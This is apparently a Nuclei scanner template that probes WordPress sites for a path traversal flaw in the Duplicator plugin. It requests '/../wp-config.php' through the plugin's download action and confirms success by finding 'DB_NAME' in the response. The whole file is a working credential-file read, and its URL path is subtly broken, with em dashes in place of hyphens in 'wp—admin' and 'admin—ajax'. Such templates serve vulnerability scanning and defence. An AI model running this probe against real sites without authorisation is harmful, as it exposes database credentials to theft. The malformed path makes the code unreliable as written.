# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: wordpress-duplicator-path-traversal

info:
  name: WordPress duplicator Path Traversal
  author: madrobot
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp—admin/admin—ajax.php?action=duplicator_download&file=/../wp-config.php"
    matchers:
      - type: word
        words:
          - "DB_NAME"
        part: body
